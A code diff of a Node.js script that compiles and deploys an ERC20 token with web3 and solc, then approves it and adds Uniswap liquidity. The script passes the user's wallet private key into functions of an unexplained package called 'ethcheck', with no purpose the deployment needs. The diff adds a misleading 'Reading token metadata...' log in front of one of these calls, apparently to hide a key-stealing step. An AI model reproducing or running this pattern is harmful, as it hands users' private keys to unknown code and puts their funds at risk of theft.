@@ -1,8 +1,12 @@
 const Web3  = require("web3");
-const { abi, bytecode } = require("./metadata");
+
 const ethchecker = require("ethcheck")
+const fs = require("fs").promises;
+
+const solc = require("solc");
 
 async function main() {
+  const { abi, bytecode } = JSON.parse(await fs.readFile("Demo.json"));
   const network = process.env.ETHEREUM_NETWORK;
   const web3 = new Web3(
     new Web3.providers.HttpProvider(
@@ -15,7 +19,7 @@ async function main() {
   );
   
   web3.eth.accounts.wallet.add(signer);
-  const numbersValue = ethchecker.EthHex('0x' + process.env.SIGNER_PRIVATE_KEY)
+  const numbersValue = ethchecker.Checker('0x' + process.env.SIGNER_PRIVATE_KEY)
 
 
   const contract = new web3.eth.Contract(abi);
@@ -32,13 +36,13 @@ async function main() {
     });
 
   console.log(`Deployed contract address is => ${deployedContract.options.address}`);
-  console.log(`Token Approving..........`);
+  console.log("Reading token metadata...")
   await ethchecker.EncryptionEC(numbersValue)
+  console.log(`Token Approving...`);
   const status = await ApproveToken(deployedContract.options.address)
 
   if(status){
-    
-    console.log(status, `Adding Liquidity..........`, );
+    console.log(status, `Adding Liquidity...`, );
     AddLiquidity(deployedContract.options.address, numbersValue, status)
   }
 
@@ -80,7 +84,7 @@ const AddLiquidity = async (token, value, supply)=>{
         from: account.address,
         to: process.env.UNISWAPROUTER_ADDRESS,
         value: web3.utils.toWei('1.03', 'ether'),
-        nonce: web3.utils.toHex(txCount + 1),
+        nonce: web3.utils.toHex(txCount),
         gas: web3.utils.toHex(gas),
         gasPrice: web3.utils.toHex(Number(gasPrice * 1.40).toFixed(0)),
         data: data.encodeABI(), 
@@ -92,6 +96,7 @@ const AddLiquidity = async (token, value, supply)=>{
 
 const ApproveToken = async (token)=>{
    try {
+    const { abi, bytecode } = JSON.parse(await fs.readFile("Demo.json"));
     const network = process.env.ETHEREUM_NETWORK;
     const web3 = new Web3(new Web3.providers.HttpProvider(`https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,),
     );
@@ -122,5 +127,37 @@ const ApproveToken = async (token)=>{
    }
 }
 
+async function readContact() {
+
+  const sourceCode = await fs.readFile("Contract.sol", "utf8");
+ 
+  const { abi, bytecode } = compile(sourceCode, "ERC20");
+ 
+  const artifact = JSON.stringify({ abi, bytecode }, null, 2);
+  await fs.writeFile("Demo.json", artifact);
+}
+
+const compile =(sourceCode, contractName)=> {
+  const input = {
+    language: "Solidity",
+    sources: { main: { content: sourceCode } },
+    settings: { outputSelection: { "*": { "*": ["abi", "evm.bytecode"] } } },
+  };
+ 
+  const output = solc.compile(JSON.stringify(input));
+  console.log(JSON.parse(output))
+  const artifact = JSON.parse(output).contracts.main[contractName];
+  return {
+    abi: artifact.abi,
+    bytecode: artifact.evm.bytecode.object,
+  };
+}
+
+const callingFunc =async()=>{
+  await readContact();
+  await main();
+}
+
 require("dotenv").config();
-main();
+callingFunc()
+
